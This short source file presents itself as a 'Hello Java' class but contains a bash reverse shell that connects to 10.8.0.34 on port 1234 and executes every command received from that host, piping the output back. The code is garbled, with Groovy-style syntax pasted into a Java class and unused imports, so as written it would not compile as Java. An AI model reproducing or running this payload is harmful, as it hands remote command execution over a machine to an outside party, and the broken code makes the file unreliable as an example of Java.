import java.io.FileOutputStream;
import java.io.IOException;

import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;

class Hihihi{  
    public static void main(String args[]){  
     System.out.println("Hello Java"); 
     r = Runtime.getRuntime()
     p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.8.0.34/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
     p.waitFor()
    }  
}

